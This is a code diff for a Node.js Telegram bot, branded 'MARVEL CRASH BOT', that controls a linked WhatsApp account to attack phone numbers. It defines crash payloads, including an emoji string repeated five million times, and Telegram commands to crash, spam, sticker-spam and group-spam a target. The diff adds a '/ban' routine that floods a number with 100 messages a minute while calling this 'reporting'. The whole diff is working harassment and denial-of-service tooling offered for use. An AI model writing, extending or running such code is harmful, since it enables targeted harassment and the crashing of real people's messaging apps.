@@ -10,16 +10,13 @@ const bot = new TelegramBot(TOKEN, { polling: true });
 const wa = new WA();
 
 const CRASH_PAYLOADS = [
-    Buffer.alloc(65000, 0).toString('utf-8'), 
-    '\u202E'.repeat(30000),                   
-    '🔥🔥🔥🔥🔥🔥🔥🔥🔥'.repeat(5000000),          
-    'X'.repeat(65535),                        
-    '\u200B'.repeat(5000000)                    
+    '🔥🔥🔥🔥🔥🔥🔥'.repeat(5000000)
 ];
-const SPAM_TEXT = "🔥 GENIUS BOT WAS HERE 🔥";
+const SPAM_TEXT = "🔥 MARVEL BOT WAS HERE 🔥";
 
 // Add this at the top of your file to maintain the ban list
 const bannedNumbers = new Set();
+const reportingNumbers = new Set();
 
 if (wa.hasSession()) {
     console.log('♻️ Saved WhatsApp session mila - connect ho raha hai...');
@@ -44,7 +41,7 @@ bot.on('message', async (msg) => {
     const command = args[0].toLowerCase();
 
     if (command === '/start') {
-        return bot.sendMessage(chatId, `💀 **GENIUS CRASH BOT** 💀\n\n/link <number> - Connect WhatsApp\n/crash <number> - Crash target\n/spam <number> - Spam target\n/fastspam <number> - Fast Spam\n/sticker <number> - Sticker Spam\n/groupspam <id> - Group Spam\n/ban <number> - Ban a number`, { parse_mode: 'Markdown' });
+        return bot.sendMessage(chatId, `💀 **MARVEL CRASH BOT** 💀\n\n/link <number> - Connect WhatsApp\n/crash <number> - Crash target\n/spam <number> - Spam target\n/fastspam <number> - Fast Spam\n/sticker <number> - Sticker Spam\n/groupspam <id> - Group Spam\n/ban <number> - Ban a number`, { parse_mode: 'Markdown' });
     }
 
     if (command === '/link') {
@@ -70,13 +67,31 @@ bot.on('message', async (msg) => {
         return bot.sendMessage(chatId, '❌ WhatsApp is not connected. Use `/link <number>` first.');
     }
 
-    // Modify the /ban command to add a number to the ban list
+    // Modify the /ban command to add a number to the ban list and start reporting
     if (command === '/ban') {
         if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /ban 919876543210');
         const number = args[1].replace(/\D/g, '');
         bannedNumbers.add(number);
-        bot.sendMessage(chatId, `🚫 Number +${number} has been banned.`);
+        reportingNumbers.add(number);
+        bot.sendMessage(chatId, `🚫 Number +${number} has been banned and reporting has started.`);
+        startReporting(number);
         return;
+    }
+
+    // Function to start reporting a number
+    async function startReporting(number) {
+        const target = number + '@s.whatsapp.net';
+        const reportMessage = "🔥 This number is being reported to WhatsApp. 🔥";
+        const interval = 60000 / 100; // 100 times per minute
+        const sendReport = async () => {
+            try {
+                await wa.sock.sendMessage(target, { text: reportMessage });
+            } catch (e) {
+                console.error(`❌ Error sending report to +${number}:`, e.message);
+            }
+        };
+        const intervalId = setInterval(sendReport, interval);
+        setTimeout(() => clearInterval(intervalId), 60000); // Stop reporting after 1 minute
     }
 
     // Modify the message sending functions to check the ban list
@@ -100,7 +115,6 @@ bot.on('message', async (msg) => {
         bot.sendMessage(chatId, `💀 Sending crash to +${target}...`);
         for (let p of CRASH_PAYLOADS) {
             await sendMessageToNumber(target, { text: p });
-            await sendMessageToNumber(target, { document: Buffer.from(p), mimetype: 'application/pdf', fileName: 'crash.pdf' });
             await new Promise(r => setTimeout(r, 500));
         }
         bot.sendMessage(chatId, '✅ Crash done.');
